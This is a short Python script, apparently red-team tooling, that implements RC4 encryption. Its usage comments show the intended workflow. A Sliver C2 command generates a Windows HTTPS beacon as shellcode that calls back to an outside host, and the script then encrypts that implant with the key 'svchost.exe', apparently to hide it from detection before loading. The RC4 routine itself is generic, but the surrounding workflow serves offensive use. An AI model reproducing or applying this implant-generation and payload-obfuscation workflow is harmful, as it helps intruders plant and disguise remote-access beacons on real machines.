# Program name:  rc4.py
# labgeek@gmail.com
# date:  5/12/2023

#Usage:
#  python3 rc4.py     
#  Usage:  ./rc4.py <key> <filename>
#  <sliver> generate beacon --seconds 10 --jitter 3 --os windows -a amd64 --format shellcode -b https://172.x.x.35 --name httpsBeacon --save /tmp/https.bin -G --skip-symbols
#  python3 rc4.py svchost.exe https.bin

import sys

def rc4(data, key):
    keylen = len(key)
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j +s[i] + key[i % keylen]) % 256
        s[i], s[j] = s[j], s[i]
    
    i = 0
    j = 0
    
    encrypted = bytearray()
    for n in range(len(data)):
        i = (i + 1) % 256
        j = (j + s[i]) % 256
        s[i], s[j] = s[j], s[i]
        encrypted.append(data[n] ^ s[(s[i] + s[j]) % 256])
        
    return encrypted
    
if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage:  ./rc4.py <key> <filename>")
        exit(0)
        
        
    key = sys.argv[1]
    filename = sys.argv[2]
    
    
    with open(filename, 'rb') as f:
        data = f.read()
        
    encrypted = rc4(data, key.encode())
    
    
    with open(f"{filename}.enc", 'wb') as f:
        f.write(encrypted)
        
    print(f"Written {filename}.enc")
